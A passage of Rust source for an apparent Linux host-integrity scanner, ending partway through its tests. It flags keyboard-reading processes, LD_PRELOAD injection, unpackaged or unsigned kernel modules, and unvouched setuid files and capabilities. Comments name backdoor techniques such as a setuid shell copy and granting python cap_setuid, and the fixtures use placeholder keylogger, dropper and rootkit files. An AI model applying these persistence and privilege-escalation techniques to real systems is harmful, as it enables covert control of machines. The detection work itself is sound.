fn reads_keys(scope: &Scope<'_>, fd: &str) -> bool {
    let Some(event) = fd.strip_prefix("/dev/input/") else {
        return false;
    };
    if !event.starts_with("event") {
        return false;
    }
    let Ok(bitmap) = fs::read_to_string(
        scope
            .root
            .join("sys/class/input")
            .join(event)
            .join("device/capabilities/key"),
    ) else {
        return true;
    };
    // Space-separated hex words, most significant first, 64 bits each.
    let words: Vec<u64> = bitmap
        .split_whitespace()
        .rev()
        .filter_map(|word| u64::from_str_radix(word, 16).ok())
        .collect();
    let has = |key: usize| {
        words
            .get(key / 64)
            .is_some_and(|word| word & (1 << (key % 64)) != 0)
    };
    // KEY_A and KEY_Z.
    has(30) && has(44)
}

/// `path` without `.`, `..` or empty parts; `None` when it climbs above `/`.
fn normalize(path: &str) -> Option<String> {
    let mut parts: Vec<&str> = Vec::new();
    for part in path.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop()?;
            }
            part => parts.push(part),
        }
    }
    (!parts.is_empty()).then(|| parts.join("/"))
}

#[derive(Debug, PartialEq, Eq)]
enum Preload {
    /// A library by path, relative to `/`.
    Path(String),
    /// A name the dynamic linker looks up (`LD_LIBRARY_PATH` decides).
    Searched(String),
}

/// The libraries a process has the dynamic linker load into it: its
/// `LD_PRELOAD` and `LD_AUDIT`.
fn preloaded(environment: Option<&[u8]>) -> Vec<Preload> {
    let Some(environment) = environment else {
        return Vec::new();
    };
    environment
        .split(|byte| *byte == 0)
        .filter_map(|entry| {
            entry
                .strip_prefix(b"LD_PRELOAD=")
                .or_else(|| entry.strip_prefix(b"LD_AUDIT="))
        })
        .flat_map(|value| {
            String::from_utf8_lossy(value)
                .split([':', ' '])
                .filter(|library| !library.is_empty())
                .filter_map(|library| match library.strip_prefix('/') {
                    Some(path) => normalize(path).map(Preload::Path),
                    None => Some(Preload::Searched(library.to_string())),
                })
                .collect::<Vec<_>>()
        })
        .collect()
}

/// The directories of a process's `LD_LIBRARY_PATH`, relative to `/`;
/// `None` for one that is relative to wherever the process runs. An empty
/// entry is left out, though it means that too: `X:$LD_LIBRARY_PATH` with
/// nothing set before leaves one in every launcher's environment. So are
/// the linker's own `$ORIGIN`, `$LIB` and `$PLATFORM`.
fn searched(environment: Option<&[u8]>) -> Vec<Option<String>> {
    let Some(environment) = environment else {
        return Vec::new();
    };
    environment
        .split(|byte| *byte == 0)
        .filter_map(|entry| entry.strip_prefix(b"LD_LIBRARY_PATH="))
        .flat_map(|value| {
            String::from_utf8_lossy(value)
                .split([':', ';'])
                .filter(|directory| !directory.is_empty() && *directory != "/")
                // The linker's own tokens stand for where the program or
                // its libraries are; with `..` they lead anywhere.
                .filter(|directory| {
                    let token = ["$ORIGIN", "${ORIGIN}", "$LIB", "${LIB}", "$PLATFORM", "${PLATFORM}"]
                        .iter()
                        .any(|token| directory.starts_with(token));
                    !token || directory.split('/').any(|part| part == "..")
                })
                .map(|directory| directory.strip_prefix('/').and_then(normalize))
                .collect::<Vec<_>>()
        })
        .collect()
}

/// The running kernel's release, as its modules directory is named.
fn kernel_release(scope: &Scope<'_>) -> Option<String> {
    release_named(&fs::read_to_string(scope.root.join(OSRELEASE)).ok()?)
}

/// Where the running kernel says which release it is, under the root.
const OSRELEASE: &str = "proc/sys/kernel/osrelease";

/// The release the text of `osrelease` names.
fn release_named(text: &str) -> Option<String> {
    // It names a directory: nothing that leads elsewhere.
    let release = text.trim();
    (!release.is_empty() && !release.contains('/') && release != "." && release != "..")
        .then(|| release.to_string())
}

/// Whether the running kernel is still the installed package's. After a
/// kernel update the running kernel's modules are gone, or put back by a
/// helper (kernel-modules-hook) outside any package, until the next boot:
/// then nothing there can be checked against a package. `modules.dep` is
/// generated by depmod; `pkgbase` comes with the kernel package.
fn kernel_installed(scope: &Scope<'_>, modules_root: &str) -> bool {
    let installed = format!("{modules_root}/pkgbase");
    scope.root.join(&installed).is_file() && packaged(scope, &installed)
}

/// Loaded modules no package installed, and the taint flag.
fn kernel(scope: &Scope<'_>, found: &mut Found) {
    let missed = "loaded kernel modules were not checked";
    let read = fs::read_to_string(scope.root.join(OSRELEASE));
    let Some(text) = found.read(scope, &format!("/{OSRELEASE}"), missed, read) else {
        return;
    };
    let Some(release) = release_named(&text) else {
        found.not_checked(
            scope,
            format!("/{OSRELEASE}: names no kernel release; {missed}"),
        );
        return;
    };
    let modules_root = format!("usr/lib/modules/{release}");
    if kernel_installed(scope, &modules_root) {
        loaded_modules(scope, &modules_root, found);
    } else {
        found.notes.push(format!(
            "kernel modules not checked: kernel {release} is no longer installed as a package (updated); they are checked again after a reboot"
        ));
    }
    let taint = kernel::taint(scope);
    if taint != 0 {
        found
            .notes
            .push(format!("the kernel is tainted ({})", taint_flags(taint)));
    }
}

/// Repository packages that ship modules built outside the kernel's own
/// tree, by the start of their name: the kernel marks those out-of-tree,
/// and the proprietary ones unsigned.
const OUT_OF_TREE_PACKAGES: &[&str] = &[
    "nvidia",
    "virtualbox",
    "vmware",
    "zfs",
    "spl",
    "v4l2loopback",
    "broadcom-wl",
    "r8168",
    "r8125",
    "acpi_call",
    "bbswitch",
    "tp_smapi",
    "vhba",
    "evdi",
    "xone",
    "xpadneo",
    "openrazer",
    "ddcci",
    "lkrg",
    "digimend",
    "rtl88",
    "rtw8",
    "facetimehd",
    "zenpower",
    "ryzen_smu",
    "nct6687d",
    "vendor-reset",
    "kvmfr",
    "sysdig",
    "falco",
];

fn loaded_modules(scope: &Scope<'_>, modules_root: &str, found: &mut Found) {
    let files: HashMap<String, String> =
        fs::read_to_string(scope.root.join(modules_root).join("modules.dep"))
            .unwrap_or_default()
            .lines()
            .filter_map(|line| line.split(':').next())
            .map(|path| (module_name(path), path.to_string()))
            .collect();
    let dkms = scope.root.join("var/lib/dkms").is_dir();
    let read = fs::read_to_string(scope.root.join("proc/modules"));
    let loaded = found
        .read(
            scope,
            "/proc/modules",
            "loaded kernel modules were not checked",
            read,
        )
        .unwrap_or_default();
    for name in loaded
        .lines()
        .filter_map(|line| line.split_whitespace().next())
    {
        let Some(file) = files.get(name) else {
            found.add_missing(
                scope,
                Category::KernelModule,
                &format!("sys/module/{name}"),
                "not among the installed modules",
                format!("module {name} is loaded but is not among this kernel's installed modules"),
                RuleId::UnknownKernelModule,
            );
            continue;
        };
        let path = format!("{modules_root}/{file}");
        if packaged(scope, &path) {
            packaged_module(scope, name, file, &path, found);
        } else if dkms && path.contains("/updates/dkms/") {
            found.add(
                scope,
                Category::KernelModule,
                &path,
                format!("module {name}, built by DKMS"),
                None,
            );
        } else {
            found.add(
                scope,
                Category::KernelModule,
                &path,
                format!("module {name} is loaded"),
                Some(RuleId::UnknownKernelModule),
            );
        }
    }
}

/// A loaded module whose file at `path` a package installed: the file is
/// compared with what the package recorded, and what the kernel says of
/// the module it loaded with what that package ships.
fn packaged_module(scope: &Scope<'_>, name: &str, file: &str, path: &str, found: &mut Found) {
    if !files::intact(scope, found, Category::KernelModule, path) {
        found.add(
            scope,
            Category::KernelModule,
            path,
            format!("module {name} is loaded, and its file is not what its package installed"),
            Some(RuleId::UnknownKernelModule),
        );
    }
    // `O` is out-of-tree, `E` unsigned: neither is said of a module the
    // kernel's own package built.
    let taint = fs::read_to_string(scope.root.join("sys/module").join(name).join("taint"))
        .unwrap_or_default();
    if !taint.contains(['O', 'E']) {
        return;
    }
    if file.starts_with("kernel/") {
        // Not the file it was loaded under that name from.
        found.add(
            scope,
            Category::KernelModule,
            path,
            format!(
                "module {name} is loaded out-of-tree or unsigned under an in-tree module's name"
            ),
            Some(RuleId::UnknownKernelModule),
        );
        return;
    }
    let package = scope
        .index
        .owner(path)
        .map(|owned| scope.index.package(owned))
        .unwrap_or_default();
    if !OUT_OF_TREE_PACKAGES
        .iter()
        .any(|known| package.starts_with(known))
    {
        found.add(
            scope,
            Category::KernelModule,
            path,
            format!(
                "module {name} is out-of-tree or unsigned, and its package ({package}) is not one known to ship such modules"
            ),
            Some(RuleId::UnknownKernelModule),
        );
    }
}

/// A module's name from its `modules.dep` path: `kernel/x/snd-hda.ko.zst`
/// is `snd_hda`.
fn module_name(path: &str) -> String {
    let file = file_name(path);
    file.split(".ko").next().unwrap_or(file).replace('-', "_")
}

fn taint_flags(taint: u64) -> String {
    let known = [
        (0, "a proprietary module"),
        (12, "an out-of-tree module"),
        (13, "an unsigned module"),
        (15, "a kernel live patch"),
    ];
    let mut reasons: Vec<&str> = known
        .iter()
        .filter(|(bit, _)| taint & (1 << bit) != 0)
        .map(|(_, reason)| *reason)
        .collect();
    if reasons.is_empty() {
        reasons.push("see /proc/sys/kernel/tainted");
    }
    format!("flags {taint}: {}", reasons.join(", "))
}

/// The directories the search for set-id files could not list, or not in
/// full: how many, and the first of them by name.
#[derive(Default)]
struct Closed {
    count: usize,
    first: Option<String>,
    /// The places closed to root on a mount where set-id bits have no
    /// effect (a user's own FUSE mount): how many, and the first by name.
    covered: usize,
    covered_first: Option<String>,
    /// Every mount, without its leading `/`, and whether it is `nosuid`;
    /// only read for root's search of the real system.
    mounts: Vec<(String, bool)>,
}

/// The mount points of a `/proc/self/mountinfo`, without their leading
/// `/`, each with whether it is mounted `nosuid`, in the file's order.
fn mounts(mountinfo: &str) -> Vec<(String, bool)> {
    mountinfo
        .lines()
        .filter_map(|line| {
            let mut fields = line.split(' ').skip(4);
            let place = fields.next()?;
            let nosuid = fields.next()?.split(',').any(|option| option == "nosuid");
            Some((
                mount_path(place).trim_start_matches('/').to_string(),
                nosuid,
            ))
        })
        .collect()
}

/// A mount point as the kernel writes it, with its `\040`-style escapes
/// read back.
fn mount_path(written: &str) -> String {
    let mut bytes = Vec::with_capacity(written.len());
    let mut rest = written.as_bytes();
    while let Some((&byte, after)) = rest.split_first() {
        let escaped = (byte == b'\\')
            .then(|| after.get(..3))
            .flatten()
            .and_then(|digits| std::str::from_utf8(digits).ok())
            .filter(|digits| digits.bytes().all(|digit| (b'0'..=b'7').contains(&digit)))
            .and_then(|digits| u8::from_str_radix(digits, 8).ok());
        if let Some(escaped) = escaped {
            bytes.push(escaped);
            rest = &after[3..];
        } else {
            bytes.push(byte);
            rest = after;
        }
    }
    String::from_utf8_lossy(&bytes).into_owned()
}

impl Closed {
    /// For a search of the real system by root, with the mounts read once.
    /// A mount point may be named in any bytes, so the file is read as
    /// bytes.
    fn of(scope: &Scope<'_>) -> Self {
        let mountinfo = if scope.root == Path::new("/") && scope.origin == Origin::Root {
            fs::read("/proc/self/mountinfo").unwrap_or_default()
        } else {
            Vec::new()
        };
        Self {
            mounts: mounts(&String::from_utf8_lossy(&mountinfo)),
            ..Self::default()
        }
    }

    /// Whether `place` is on a mount where set-id bits have no effect:
    /// the mount it is on is the deepest one above it, and of two at one
    /// place the later.
    fn without_set_id(&self, place: &str) -> bool {
        let mut on: Option<&(String, bool)> = None;
        for mount in &self.mounts {
            let above = mount.0.is_empty()
                || place
                    .strip_prefix(mount.0.as_str())
                    .is_some_and(|rest| rest.is_empty() || rest.starts_with('/'));
            if above && on.is_none_or(|deepest| mount.0.len() >= deepest.0.len()) {
                on = Some(mount);
            }
        }
        on.is_some_and(|mount| mount.1)
    }

    fn add(&mut self, directory: &str) {
        let (count, first) = if self.without_set_id(directory) {
            (&mut self.covered, &mut self.covered_first)
        } else {
            (&mut self.count, &mut self.first)
        };
        *count += 1;
        if first.as_deref().is_none_or(|first| directory < first) {
            *first = Some(directory.to_string());
        }
    }

    /// Says it in one sentence, however many there are. A user's sweep
    /// cannot list much of the system (`/root`, other homes), which is
    /// what the root checks are for; root, which nothing stands behind,
    /// leaves them unchecked and names one.
    fn say(self, scope: &Scope<'_>, found: &mut Found) {
        // Nothing on such a mount is set-id to anyone, so the search is
        // whole without it; but the mount covers a directory that is not
        // on it, and that is said.
        if let Some(first) = &self.covered_first {
            found.notes.push(format!(
                "{} place(s) on mounts closed to root were not looked into (/{} among them): set-id bits have no effect on such a mount, but what its mount point covers cannot be seen",
                self.covered,
                first.escape_debug()
            ));
        }
        let Some(first) = self.first else {
            return;
        };
        let count = self.count;
        if scope.origin == Origin::Root {
            found.unchecked.push(format!(
                "setuid programs were not looked for in {count} place(s) that could not be listed (/{} among them)",
                first.escape_debug()
            ));
        } else {
            found.notes.push(format!(
                "setuid programs were not looked for in {count} place(s) that could not be listed; the root checks cover them"
            ));
        }
    }
}

/// Setuid and setgid files that no package vouches for.
fn set_id_files(scope: &Scope<'_>, found: &mut Found) {
    let mut looked_at = 0;
    let mut closed = Closed::of(scope);
    let root = scope.origin == Origin::Root;
    'walk: for start in PRIVILEGED_ROOTS {
        let mut pending = vec![(*start).to_string()];
        while let Some(directory) = pending.pop() {
            // Listed through the directory as opened, link by no link: a
            // directory swapped for a link elsewhere is not walked into.
            let opened =
                match read::seen(scope.root, &directory, View::Pinned).map(|seen| seen.what) {
                    Some(read::Public::Directory(opened)) => opened,
                    Some(read::Public::Link(_)) if directory == *start => {
                        found.unchecked.push(format!(
                            "/{directory} is a link: setuid programs were not looked for there"
                        ));
                        continue;
                    }
                    // No directory (any more): a link or a file.
                    Some(_) => continue,
                    // The pinned walk does not say why it shows nothing:
                    // what is gone is nothing, what is still there was
                    // not looked into.
                    None => {
                        let gone = fs::symlink_metadata(scope.root.join(&directory)).map_or_else(
                            |error| error.kind() == io::ErrorKind::NotFound,
                            |metadata| !metadata.is_dir(),
                        );
                        if !gone {
                            closed.add(&directory);
                        }
                        continue;
                    }
                };
            let Ok(listing) = fs::read_dir(format!("/proc/self/fd/{}", opened.as_raw_fd())) else {
                closed.add(&directory);
                continue;
            };
            let mut whole = true;
            for entry in listing {
                looked_at += 1;
                if looked_at > MAX_WALK {
                    found.unchecked.push(format!(
                        "more than {MAX_WALK} files: setuid programs were not looked for everywhere"
                    ));
                    break 'walk;
                }
                // An entry that went away meanwhile is nothing; one that
                // is there and cannot be asked about may be anything.
                let entry = match entry {
                    Ok(entry) => entry,
                    Err(error) => {
                        whole = whole && error.kind() == io::ErrorKind::NotFound;
                        continue;
                    }
                };
                let metadata = match entry.metadata() {
                    Ok(metadata) => metadata,
                    Err(error) => {
                        // A mount closed to root shows here, not when it
                        // is opened, and is counted by its own name; any
                        // other entry leaves its directory not whole.
                        let path = format!("{directory}/{}", entry.file_name().to_string_lossy());
                        if error.kind() == io::ErrorKind::NotFound {
                        } else if closed.without_set_id(&path) {
                            closed.add(&path);
                        } else {
                            whole = false;
                        }
                        continue;
                    }
                };
                let Some(name) = entry.file_name().to_str().map(str::to_string) else {
                    // A directory may hold set-id files; a file may be one.
                    if metadata.is_dir() || (metadata.is_file() && metadata.mode() & 0o6000 != 0) {
                        found.unchecked.push(collect::not_utf8(&format!(
                            "{directory}/{}",
                            entry.file_name().to_string_lossy()
                        )));
                    }
                    continue;
                };
                let path = format!("{directory}/{name}");
                if metadata.is_dir() {
                    if name != ".snapshots" && !PRIVILEGED_SKIPPED.contains(&path.as_str()) {
                        pending.push(path);
                    }
                } else if metadata.is_file() && metadata.mode() & 0o6000 != 0 {
                    let looked = collect::look(scope, Category::Setuid, &path, None);
                    // Root reports the file it opened, if that is the
                    // set-id file the listing showed.
                    let swapped = root
                        && !matches!(&looked, read::Found::File { mode, .. } if mode & 0o6000 != 0)
                        && !matches!(&looked, read::Found::Unreadable(reason) if reason == read::TOO_LARGE);
                    if !swapped {
                        privileged(scope, found, &path, &looked, "setuid or setgid", None);
                    }
                }
            }
            if !whole {
                closed.add(&directory);
            }
        }
    }
    closed.say(scope, found);
}

/// Setuid and setgid files, and files with capabilities, that no package
/// vouches for.
fn privileged_files(scope: &Scope<'_>, found: &mut Found) {
    set_id_files(scope, found);
    match capability_files(scope) {
        Ok(files) => {
            // A name that is not UTF-8 comes out of getcap unreadable.
            found.unchecked.extend(
                files
                    .iter()
                    .filter(|(path, _)| path.contains('\u{fffd}'))
                    .map(|(path, _)| collect::not_utf8(path)),
            );
            for (path, capabilities) in files {
                // A name with a newline in it forges a line of getcap's
                // output, naming any path; only real files count, and the
                // file itself, not what a link of that name leads to.
                let Some(looked) = capable(scope, &path, &mut found.unchecked) else {
                    continue;
                };
                privileged(
                    scope,
                    found,
                    &path,
                    &looked,
                    &format!("capabilities {capabilities}"),
                    Some(&capabilities),
                );
            }
        }
        Err(reason) => found
            .unchecked
            .push(format!("file capabilities were not checked ({reason})")),
    }
}

/// What is at `path`, which getcap named, if it is a regular file. Root
/// looks at a path anyone can read as anyone would, and at one only root
/// can read once getcap, asked about it by itself, names it again: a forged
/// line then says nothing about a file its author cannot read.
fn capable(scope: &Scope<'_>, path: &str, unchecked: &mut Vec<String>) -> Option<read::Found> {
    let looked = if scope.origin == Origin::Root {
        read::look_as(scope.root, path, View::Everyone).or_else(|| {
            let Some(confirmed) = has_capabilities(path) else {
                // Which file is not said: the line may be forged.
                unchecked.push("a file getcap named could not be asked about again".into());
                return None;
            };
            confirmed
                .then(|| read::look_as(scope.root, path, View::Pinned))
                .flatten()
        })?
    } else {
        read::look(scope.root, path)
    };
    match looked {
        read::Found::Link(_) | read::Found::Other => None,
        // Root's pinned look says this only of a regular file; the user's
        // own sweep asks again.
        read::Found::Unreadable(_)
            if scope.origin != Origin::Root
                && !fs::symlink_metadata(scope.root.join(path))
                    .is_ok_and(|metadata| metadata.is_file()) =>
        {
            None
        }
        looked => Some(looked),
    }
}

fn privileged(
    scope: &Scope<'_>,
    found: &mut Found,
    path: &str,
    looked: &read::Found,
    what: &str,
    capabilities: Option<&str>,
) {
    let item = collect::item_of(scope, Category::Setuid, path.to_string(), None, looked);
    // A package's set-id file only root can read cannot be hashed here; the
    // root checks hash it. Its owner and mode are what can be checked now.
    if matches!(item.body, Body::Unreadable(_)) && packaged(scope, path) {
        return;
    }
    // A copy of a packaged program with extra rights is the classic
    // backdoor (a setuid copy of a shell), so a copy is not trusted here.
    let vouched = matches!(item.tier, Tier::Vendor | Tier::Inert | Tier::Allowed);
    // Capabilities are not part of what pacman records, so a packaged
    // program given some (`setcap cap_setuid+ep python`, or all of them
    // with `=ep`) is only trusted with exactly those its package is known
    // to set.
    let (rule, why) = if vouched {
        match capabilities.and_then(|capabilities| unexpected_capabilities(path, capabilities)) {
            Some(RuleId::UnknownPrivilegedFile) => (
                RuleId::UnknownPrivilegedFile,
                "root-like rights its package does not set",
            ),
            Some(rule) => (rule, "rights its package does not set"),
            None => return,
        }
    } else {
        (RuleId::UnknownPrivilegedFile, "no package vouches for it")
    };
    found.items.entry(path.to_string()).or_insert(item);
    found.add(
        scope,
        Category::Setuid,
        path,
        format!("{what}; {why}"),
        Some(rule),
    );
}

/// The capabilities getcap's clauses give a file: every one (`=ep`,
/// `all=ep`), or those named, sorted. A clause lists names, then `=`, `+`
/// or `-` and the sets (`e`, `i`, `p`) it puts them in or takes them from;
/// one that only takes away, or puts them in no set, gives nothing.
fn capability_names(clauses: &str) -> Option<Vec<String>> {
    let mut names = Vec::new();
    for clause in clauses.split_whitespace() {
        // `[rootid=1000]`: whose root the capabilities are for.
        if clause.starts_with('[') {
            continue;
        }
        let split = clause.find(['=', '+', '-']).unwrap_or(clause.len());
        let (named, sets) = clause.split_at(split);
        // Only `=` and `+` followed by a set give something.
        let mut taking = false;
        let mut gives = false;
        for c in sets.chars() {
            match c {
                '-' => taking = true,
                '=' | '+' => taking = false,
                'e' | 'i' | 'p' if !taking => gives = true,
                _ => {}
            }
        }
        if !gives {
            continue;
        }
        if named.is_empty() || named.eq_ignore_ascii_case("all") {
            return None;
        }
        names.extend(named.split(',').map(str::to_ascii_lowercase));
    }
    names.sort();
    names.dedup();
    Some(names)
}

/// The alert for capabilities on the packaged file at `path` that its
/// package is not known to set, by how far they go; none where they are
/// exactly the expected ones.
fn unexpected_capabilities(path: &str, clauses: &str) -> Option<RuleId> {
    let Some(names) = capability_names(clauses) else {
        // Every capability there is.
        return Some(RuleId::UnknownPrivilegedFile);
    };
    let expected = EXPECTED_CAPABILITIES
        .iter()
        .any(|(known, capabilities)| *known == path && names == *capabilities);
    if names.is_empty() || expected {
        return None;
    }
    let root_like = names.iter().any(|name| {
        ROOT_CAPABILITIES.contains(&name.as_str()) || !OTHER_CAPABILITIES.contains(&name.as_str())
    });
    Some(if root_like {
        RuleId::UnknownPrivilegedFile
    } else {
        RuleId::UnexpectedCapability
    })
}

/// Whether getcap, asked about `path` alone, reports capabilities on it.
fn has_capabilities(path: &str) -> Option<bool> {
    let limits = Limits {
        timeout_secs: 30,
        max_output: 64 * 1024,
    };
    let arguments = [OsString::from(format!("/{path}"))];
    tools::run(
        Path::new(GETCAP),
        &arguments,
        None,
        &[("LC_ALL", "C")],
        limits,
    )
    .ok()
    .filter(|captured| getcap_failure(captured.status).is_none())
    .map(|captured| {
        parse_getcap(&String::from_utf8_lossy(&captured.stdout))
            .iter()
            .any(|(reported, _)| reported == path)
    })
}

/// How a getcap that did not give a whole answer ended. It exits with 0
/// whatever it found or could not open, so anything else (a time-out, a
/// signal, a failure) leaves part of the answer out.
fn getcap_failure(status: ExitStatus) -> Option<String> {
    if status.success() {
        None
    } else if status.code() == Some(124) {
        // GNU timeout exits 124 when it had to stop the command.
        Some("getcap timed out".into())
    } else {
        Some(format!("getcap failed: {status}"))
    }
}

/// Files with capabilities, from `getcap -r` (on the real system only).
fn capability_files(scope: &Scope<'_>) -> Result<Vec<(String, String)>, String> {
    if scope.root != Path::new("/") {
        return Ok(Vec::new());
    }
    let roots: Vec<OsString> = PRIVILEGED_ROOTS
        .iter()
        .map(|root| OsString::from(format!("/{root}")))
        .filter(|root| Path::new(root).is_dir())
        .collect();
    capabilities_below(Path::new(GETCAP), &roots)
}

/// What `getcap -r` reports below `roots`. A getcap that is missing,
/// cannot be started or does not finish is an error: what it printed until
/// then is not the whole list.
fn capabilities_below(getcap: &Path, roots: &[OsString]) -> Result<Vec<(String, String)>, String> {
    if !getcap.is_file() {
        return Err(format!("{} is not installed", getcap.display()));
    }
    let mut args = vec![OsString::from("-r")];
    args.extend(roots.iter().cloned());
    let captured = tools::run(
        getcap,
        &args,
        None,
        &[("LC_ALL", "C")],
        Limits {
            timeout_secs: 300,
            max_output: 4 * 1024 * 1024,
        },
    )
    .map_err(|error| error.to_string())?;
    if let Some(failure) = getcap_failure(captured.status) {
        return Err(failure);
    }
    Ok(parse_getcap(&String::from_utf8_lossy(&captured.stdout)))
}

/// Whether `word` is a clause of getcap's output: names (or numbers, for
/// capabilities getcap has no name for), then the sets they are in.
fn is_clause(word: &str) -> bool {
    if word.starts_with("[rootid=") && word.ends_with(']') {
        return true;
    }
    let Some(split) = word.find(['=', '+', '-']) else {
        return false;
    };
    let (names, sets) = word.split_at(split);
    names
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | ','))
        && sets.chars().all(|c| "=+-eip".contains(c))
}

/// `getcap` lines: the path, then capability clauses (`cap_x,cap_y=ep`,
/// `=ep`, `cap_x+ep cap_y+i`, ` [rootid=N]`); a path may hold spaces, so
/// the clauses are taken from the end of the line.
fn parse_getcap(text: &str) -> Vec<(String, String)> {
    text.lines()
        .filter_map(|line| {
            let mut split = line.len();
            while let Some((before, word)) = line[..split].rsplit_once(' ')
                && is_clause(word)
            {
                split = before.len();
            }
            let (path, capabilities) = line.split_at(split);
            (!capabilities.is_empty()).then_some(())?;
            Some((
                path.strip_prefix('/')?.to_string(),
                capabilities.trim().to_string(),
            ))
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use std::collections::HashSet;
    use std::fmt::Write as _;
    use std::fs;
    use std::os::unix::fs::{PermissionsExt, symlink};
    use std::path::Path;

    use super::net::{is_loopback, socket};
    use super::{Preload, check, module_name, parse_getcap, preloaded};
    use crate::autorun::Category;
    use crate::rules::RuleId;
    use crate::sha256::Sha256;
    use crate::sweep::collect::{Body, Origin, Scope};
    use crate::sweep::index::PackageIndex;
    use crate::test_support::TempDir;

    fn write(root: &Path, path: &str, text: &str) {
        fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
        fs::write(root.join(path), text).unwrap();
    }

    fn process(root: &Path, pid: &str, exe: &str, fds: &[(&str, &str)], environment: &str) {
        let directory = root.join("proc").join(pid);
        fs::create_dir_all(directory.join("fd")).unwrap();
        symlink(exe, directory.join("exe")).unwrap();
        for (fd, target) in fds {
            symlink(target, directory.join("fd").join(fd)).unwrap();
        }
        fs::write(directory.join("environ"), environment.replace(';', "\0")).unwrap();
    }

    #[test]
    fn procfs_fields_are_read() {
        assert_eq!(
            module_name("kernel/sound/snd-hda-intel.ko.zst"),
            "snd_hda_intel"
        );
        assert_eq!(
            preloaded(Some(
                b"A=1\0LD_PRELOAD=/usr/lib/x.so:/./home//u/.y.so libz.so\0"
            )),
            [
                Preload::Path("usr/lib/x.so".into()),
                Preload::Path("home/u/.y.so".into()),
                Preload::Searched("libz.so".into())
            ]
        );
        assert_eq!(
            parse_getcap(
                "/usr/bin/a b cap_setuid=ep\n/usr/bin/c =ep [rootid=1000]\n/usr/bin/d cap_net_raw,cap_setgid=ep cap_chown=i\n"
            ),
            [
                ("usr/bin/a b".to_string(), "cap_setuid=ep".to_string()),
                ("usr/bin/c".to_string(), "=ep [rootid=1000]".to_string()),
                (
                    "usr/bin/d".to_string(),
                    "cap_net_raw,cap_setgid=ep cap_chown=i".to_string()
                ),
            ]
        );
        assert!(is_loopback("0100007F") && !is_loopback("00000000"));
        assert!(is_loopback("00000000000000000000000001000000"));
        assert!(!is_loopback("00000000000000000000000000000000"));
        let line = "   0: 00000000:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 4242 1";
        let listening = socket(line).unwrap();
        assert_eq!(
            super::net::shown_for_test(&listening),
            ("0.0.0.0".to_string(), 8080, true, "4242".to_string())
        );
    }

    /// The fixture's processes: fine ones and odd ones.
    fn processes(root: &Path) {
        process(
            root,
            "1",
            "/usr/bin/hyprland",
            &[("3", "/dev/input/event0")],
            "",
        );
        process(root, "2", "/usr/bin/updated (deleted)", &[], "");
        process(root, "3", "/tmp/gone (deleted)", &[], "");
        process(root, "4", "/memfd:payload (deleted)", &[], "");
        process(
            root,
            "5",
            "/home/u/.local/bin/keylog",
            &[("3", "/dev/input/event2")],
            "",
        );
        process(root, "6", "/home/u/.cache/dropper", &[], "");
        // A game controller: an input device without letter keys.
        write(root, "home/u/.local/bin/game", "game");
        write(
            root,
            "sys/class/input/event5/device/capabilities/key",
            "7fff000000000000 0\n",
        );
        process(
            root,
            "9",
            "/home/u/.local/bin/game",
            &[("3", "/dev/input/event5")],
            "",
        );
        // A packaged interpreter listening, with no script on disk.
        process(root, "10", "/usr/bin/python3", &[("4", "socket:[333]")], "");
        // A program no package installed, replaced while it runs.
        write(root, "home/u/.local/bin/tool", "new tool");
        process(root, "11", "/home/u/.local/bin/tool (deleted)", &[], "");
        process(
            root,
            "7",
            "/usr/bin/hyprland",
            &[],
            "LD_PRELOAD=/home/u/.evil.so;",
        );
        process(
            root,
            "8",
            "/home/u/server",
            &[("4", "socket:[222]"), ("5", "socket:[111]")],
            "",
        );
    }

    /// A system with one of everything the live checks look for, and
    /// what is fine next to each.
    fn fixture() -> (TempDir, PackageIndex) {
        let dir = TempDir::new("sweep-live");
        let root = dir.path();
        let digest = |text: &str| Sha256::digest(text.as_bytes());
        for (path, text) in [
            ("usr/bin/hyprland", "compositor"),
            ("usr/bin/updated", "new version"),
            ("usr/lib/modules/6.1-test/kernel/a.ko.zst", "module a"),
        ] {
            write(root, path, text);
        }
        write(root, "home/u/.local/bin/keylog", "keylogger");
        write(root, "home/u/.cache/dropper", "dropper");
        write(root, "home/u/.evil.so", "preloaded");
        write(root, "home/u/server", "server");
        write(root, "usr/lib/modules/6.1-test/extra/rootkit.ko", "rootkit");
        write(
            root,
            "usr/lib/modules/6.1-test/modules.dep",
            "kernel/a.ko.zst:\nextra/rootkit.ko:\n",
        );
        write(root, "proc/sys/kernel/osrelease", "6.1-test\n");
        write(root, "usr/lib/modules/6.1-test/pkgbase", "linux\n");
        write(root, "usr/bin/python3", "python");
        write(root, "proc/sys/kernel/tainted", "4096\n");
        write(
            root,
            "proc/modules",
            "a 1 0 - Live 0x0\nrootkit 1 0 - Live 0x0\nghost 1 0 - Live 0x0\n",
        );
        write(
            root,
            "proc/net/tcp",
            "  sl  local_address rem_address   st\n   0: 0100007F:0277 00000000:0000 0A 0:0 0:0 0 1000 0 111 1\n   1: 00000000:1F90 00000000:0000 0A 0:0 0:0 0 1000 0 222 1\n   2: 00000000:115C 00000000:0000 0A 0:0 0:0 0 1000 0 333 1\n",
        );
        processes(root);
        write(root, "usr/bin/helper", "helper");
        fs::set_permissions(
            root.join("usr/bin/helper"),
            fs::Permissions::from_mode(0o4755),
        )
        .unwrap();
        // A setuid copy of a packaged program.
        write(root, "home/u/shell", "compositor");
        fs::set_permissions(
            root.join("home/u/shell"),
            fs::Permissions::from_mode(0o4755),
        )
        .unwrap();

        let mut index = PackageIndex::with_foreign(HashSet::new());
        index.add_for_test(
            "core",
            &format!(
                "#mtree\n/set type=file mode=755\n./usr/bin/hyprland sha256digest={}\n./usr/bin/updated sha256digest={}\n./usr/bin/python3 sha256digest={}\n./usr/lib/modules/6.1-test/kernel/a.ko.zst mode=644 sha256digest={}\n./usr/lib/modules/6.1-test/pkgbase mode=644 sha256digest={}\n",
                digest("compositor"),
                digest("new version"),
                digest("python"),
                digest("module a"),
                digest("linux\n")
            ),
            &[],
        );
        (dir, index)
    }

    #[test]
    fn a_process_is_roots_by_its_ids_not_by_who_owns_its_directory() {
        let dir = TempDir::new("sweep-of-root");
        let status = |ids: &str| {
            fs::write(
                dir.path().join("status"),
                format!("Name:\tx\nUid:\t{ids}\nGid:\t0\t0\t0\t0\n"),
            )
            .unwrap();
            super::of_root(dir.path())
        };
        assert!(status("0\t0\t0\t0"));
